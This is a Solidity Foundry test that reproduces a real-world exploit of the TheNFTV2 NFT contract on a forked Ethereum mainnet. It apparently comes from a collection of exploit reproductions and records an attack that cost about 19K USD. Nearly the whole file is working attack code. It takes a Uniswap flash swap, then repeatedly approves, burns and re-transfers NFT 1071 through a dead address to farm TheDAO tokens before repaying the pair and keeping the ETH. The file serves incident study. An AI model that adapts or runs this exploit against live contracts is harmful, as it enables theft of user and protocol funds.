pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";

import {IERC721} from "src/interfaces/IERC721.sol";

import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
import {IWETH} from "src/interfaces/IWETH.sol";
// @KeyInfo - Total Lost : ~19K USD$
// Attacker - https://etherscan.io/address/0x2F746bC70f72aAF3340B8BbFd254fd91a3996218
// Attack contract - https://etherscan.io/address/0x85301f7b943fd132c8dbc33f8fd9d77109a84f28
// Attack Tx : https://etherscan.io/tx/0xd5b4d68432cbbd912130bbb5b93399031ddbb400d8f723c78050574de7533106

// @Analysis - https://x.com/MetaTrustAlert/status/1728616715825848377?s=20

interface ITheNFTV2 {

    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
    event BaseURI(string);
    event Burn(address owner, uint256 tokenId);
    event Mint(address owner, uint256 tokenId);
    event OwnershipTransferred(address previousOwner, address newOwner);
    event Restore(address owner, uint256 tokenId);
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
    event Upgrade(address owner, uint256 tokenId);

    function PDF_SHA_256_HASH() external view returns (string memory);
    function PNG_SHA_256_HASH() external view returns (string memory);
    function approve(address _to, uint256 _tokenId) external;
    function balanceOf(address _holder) external view returns (uint256);
    function burn(uint256 id) external;
    function curator() external view returns (address);
    function getApproved(uint256 _tokenId) external view returns (address);
    function getStats(address _user) external view returns (uint256[] memory);
    function isApprovedForAll(address _owner, address _operator) external view returns (bool);
    function mint(uint256 i) external;
    function name() external pure returns (string memory);
    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4);
    function owner() external view returns (address);
    function ownerOf(uint256 _tokenId) external view returns (address);
    function renounceOwnership() external;
    function restore(uint256 id) external;
    function safeTransferFrom(address _from, address _to, uint256 _tokenId) external;
    function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes memory _data) external;
    function setApprovalForAll(address _operator, bool _approved) external;
    function setBaseURI(string memory _uri) external;
    function setCurator(address _curator) external;
    function supportsInterface(bytes4 interfaceId) external pure returns (bool);
    function symbol() external pure returns (string memory);
    function toString(uint256 value) external pure returns (string memory);
    function tokenByIndex(uint256 _index) external view returns (uint256);
    function tokenOfOwnerByIndex(address _owner, uint256 _index) external view returns (uint256);
    function tokenURI(uint256 _tokenId) external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _tokenId) external;
    function upgrade(uint256[] memory _ids) external;

}

contract TheNFTV2Test is Test {

    ITheNFTV2 THENFTV2 = ITheNFTV2(0x79a7D3559D73EA032120A69E59223d4375DEb595);
    IERC20 TheDAO = IERC20(0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413);
    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair uniswap = IUniswapV2Pair(0xE1eCaDb5FEC254c2c893C230b935Db30b8FfF0db);
    uint256 constant nftId = 1071;
    address hacker = 0x85301f7b943fd132c8dBc33f8FD9d77109A84f28;
    address deadaddress = 0x000000000000000000000000000000000074eda0;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_647_450);
        vm.label(address(WETH), "WETH");
        vm.label(address(THENFTV2), "THENFTV2");
        vm.label(address(uniswap), "Uniswap Pair");
        vm.label(address(TheDAO), "TheDAO");
    }

    function test() public {
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 80_000 * 1e18;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        emit log_named_decimal_uint("[Start] Attacker ETH Balance", WETH.balanceOf(address(this)), WETH.decimals());

        uint256 balanceBefore = address(this).balance;
        vm.prank(hacker);
        THENFTV2.transferFrom(address(hacker), address(this), nftId);

        uniswap.swap(0, 1_906_331_836_125_411_716, address(this), new bytes(1));
        uint256 balanceAfter = address(this).balance;
        assert(balanceAfter > balanceBefore);

        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 0);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (uint256 thedaoReserve, uint256 wethReserve,) = uniswap.getReserves();
        emit log_named_uint("k0:", thedaoReserve * wethReserve);
        uint256 amountOut = amount1;
        uint256 amountIn = getAmountIn(amountOut, thedaoReserve, wethReserve);
        emit log_named_uint("amountIn", amountIn);

        do {
            THENFTV2.approve(address(this), nftId);
            THENFTV2.burn(nftId);
            THENFTV2.transferFrom(deadaddress, address(this), nftId);
        } while (TheDAO.balanceOf(address(this)) < amountIn);
        TheDAO.transfer(address(uniswap), TheDAO.balanceOf(address(this)));
        WETH.withdraw(WETH.balanceOf(address(this)));
    }

    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256 amountIn)
    {
        require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 numerator = reserveIn * amountOut * (1000);
        uint256 denominator = (reserveOut - amountOut) * (997);
        amountIn = (numerator / denominator) + (1);
    }

    receive() external payable {}

}
